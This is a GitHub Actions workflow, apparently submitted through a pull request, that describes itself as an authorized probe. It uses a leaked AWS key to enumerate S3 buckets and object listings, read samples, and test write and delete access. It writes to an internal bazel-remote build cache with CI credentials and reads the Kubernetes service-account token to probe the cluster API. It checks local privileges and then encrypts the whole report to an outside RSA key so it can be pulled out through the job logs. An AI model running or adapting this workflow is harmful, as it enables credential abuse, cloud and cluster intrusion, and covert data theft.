name: zz-s3-probe

# Authorized assessment probe (radkawar, owner consent).
# 1. Enumerate every bucket the leaked AWS key can see, then each bucket's
#    contents (keys/sizes/counts, bounded; never object bodies).
# 2. Per-bucket read + write/delete capability (unique marker, deleted inline).
# 3. bazel-remote capability through the real client (bazel, cache-rw config).
# 4. Kubernetes API reachability via alternate routes + local privilege check.
# Whole report is encrypted to the ephemeral RSA public key before printing.

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  sweep:
    name: s3 enumeration and capability
    runs-on: omp-kata
    timeout-minutes: 20
    steps:
      - name: sweep
        run: |
          set +e
          R=/tmp/report; : > "$R"
          log() { echo "$@" | tee -a "$R"; }
          EP="${SCCACHE_ENDPOINT:-}"; BASE="http://$EP"
          SIG=(--aws-sigv4 "aws:amz:${SCCACHE_REGION:-us-east-1}:s3" --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
          log "## host=$(hostname) run=${GITHUB_RUN_ID} endpoint=$EP"

          log ""
          log "## 1. buckets visible to the key"
          curl -sS --max-time 15 "${SIG[@]}" "$BASE/" -o /tmp/buckets.xml
          mapfile -t BUCKETS < <(sed -n 's:.*<Name>\([^<]*\)</Name>.*:\1:p' /tmp/buckets.xml)
          log "count=${#BUCKETS[@]}"
          for b in "${BUCKETS[@]}"; do log "  bucket=$b"; done

          log ""
          log "## 2. per-bucket contents and capability"
          for b in "${BUCKETS[@]}"; do
            log "--- $b"
            code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "${SIG[@]}" "$BASE/$b?versioning")
            log "    versioning: HTTP $code $(sed -n 's:.*<Status>\([^<]*\)</Status>.*:\1:p' /dev/null)"
            code=$(curl -sS -o /tmp/pol -w '%{http_code}' --max-time 15 "${SIG[@]}" "$BASE/$b?policy")
            log "    policy:     HTTP $code $(head -c 120 /tmp/pol | tr -d '\n')"
            code=$(curl -sS -o /tmp/acl -w '%{http_code}' --max-time 15 "${SIG[@]}" "$BASE/$b?acl")
            log "    acl:        HTTP $code"
            code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "$BASE/$b?list-type=2&max-keys=1")
            log "    anon list:  HTTP $code"

            total=0; bytes=0; tok=""; page=0
            : > /tmp/keys.txt
            while :; do
              page=$((page+1)); [ $page -gt 25 ] && break
              q="list-type=2&max-keys=1000"
              [ -n "$tok" ] && q="$q&continuation-token=$tok"
              curl -sS --max-time 20 "${SIG[@]}" "$BASE/$b?$q" -o /tmp/page.xml
              n=$(grep -c '<Key>' /tmp/page.xml)
              s=$(sed -n 's:.*<Size>\([0-9]*\)</Size>.*:\1:p' /tmp/page.xml | paste -sd+ | bc 2>/dev/null)
              total=$((total+n)); bytes=$((bytes+${s:-0}))
              sed -n 's:.*<Key>\([^<]*\)</Key>.*:\1:p' /tmp/page.xml >> /tmp/keys.txt
              tok=$(sed -n 's:.*<NextContinuationToken>\([^<]*\)</NextContinuationToken>.*:\1:p' /tmp/page.xml | head -1)
              [ -z "$tok" ] && break
            done
            log "    objects=$total bytes=$bytes (pages=$page)"
            log "    sample keys (first 12):"
            head -12 /tmp/keys.txt | sed 's/^/      /'

            first=$(head -1 /tmp/keys.txt)
            if [ -n "$first" ]; then
              code=$(curl -sS -o /tmp/obj -w '%{http_code}' --max-time 20 "${SIG[@]}" "$BASE/$b/$first")
              log "    read sample: GET $first -> HTTP $code bytes=$(wc -c </tmp/obj)"
            fi
            K="probe-radkawar-${GITHUB_RUN_ID}"
            wcode=$(printf 'radkawar-write-probe' | curl -sS -o /dev/null -w '%{http_code}' --max-time 20 -X PUT --data-binary @- "${SIG[@]}" "$BASE/$b/$K")
            rcode=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 20 "${SIG[@]}" "$BASE/$b/$K")
            dcode=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 20 -X DELETE "${SIG[@]}" "$BASE/$b/$K")
            log "    write probe: PUT=$wcode GET=$rcode DELETE=$dcode"
          done

          log ""
          log "## 3. bazel-remote through the real client"
          BW=/tmp/bw; rm -rf "$BW"; mkdir -p "$BW"
          printf 'genrule(name="x", outs=["o.txt"], cmd="echo radkawar-probe-%s > $@")\n' "$GITHUB_RUN_ID" > "$BW/BUILD.bazel"
          printf 'module(name="probe")\n' > "$BW/MODULE.bazel"
          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
          RC="grpcs://bazel-remote.bazel-cache.svc.cluster.local:9092"
          cd "$BW"
          for attempt in 1 2; do
            log "-- bazel build attempt $attempt (fresh output base, upload=on)"
            timeout 300 bazel --output_base=/tmp/bazel-out-$attempt build //:x \
              --remote_cache="$RC" --remote_header="authorization=Basic $AUTH" \
              --remote_upload_local_results=true --remote_timeout=45 --noremote_accept_cached 2>&1 \
              | grep -iE "remote cache|upload|ERROR|WARNING|UNAUTHENTICATED|PERMISSION_DENIED|action cache|failed|INFO: Elapsed" | head -12 | sed 's/^/     /'
            log "     exit=$?"
          done
          log "-- same build, accept remote cache (read path)"
          timeout 300 bazel --output_base=/tmp/bazel-out-3 build //:x \
            --remote_cache="$RC" --remote_header="authorization=Basic $AUTH" \
            --remote_download_outputs=minimal --remote_timeout=45 2>&1 \
            | grep -iE "remote cache|hit|ERROR|UNAUTHENTICATED|PERMISSION_DENIED|INFO: Elapsed" | head -12 | sed 's/^/     /'
          log "     exit=$?"

          log ""
          log "## 4. kubernetes reachability (alternate routes) + local privilege"
          SA=/var/run/secrets/kubernetes.io/serviceaccount
          TOK=$(cat "$SA/token" 2>/dev/null)
          KIP=$(getent hosts kubernetes.default.svc.cluster.local | awk '{print $1}' | head -1)
          GW=$(ip route 2>/dev/null | awk '/^default/{print $3; exit}')
          log "kube svc ip=${KIP:-none} default gw=${GW:-none}"
          for tgt in "${KIP:+https://$KIP:443}" "${GW:+https://$GW:6443}" "${GW:+https://$GW:443}"; do
            [ -z "$tgt" ] && continue
            code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 6 --cacert "$SA/ca.crt" -H "Authorization: Bearer $TOK" "$tgt/version")
            log "GET  $tgt/version -> $code"
          done
          log "sudo -n id: $(sudo -n id 2>&1 | head -1)"
          log "docker: $(docker info --format '{{.ServerVersion}}' 2>&1 | head -1)"
          log "sockets: $(find /run /var/run -maxdepth 3 -name '*.sock' 2>/dev/null | tr '\n' ' ')"
          log "capabilities: $(grep CapEff /proc/self/status)"
          log "uname: $(uname -r)  mounts=r$(findmnt -n -o FSTYPE / | head -1)"

          printf '%s' '' | base64 -d > /tmp/pub.der
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16)
          printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in "$R" -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
            -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-BLOB=$(base64 -w0 /tmp/ct)"
          echo "PROBE-PLAINTEXT-SHA256=$(sha256sum "$R" | cut -d' ' -f1)"
          exit 0
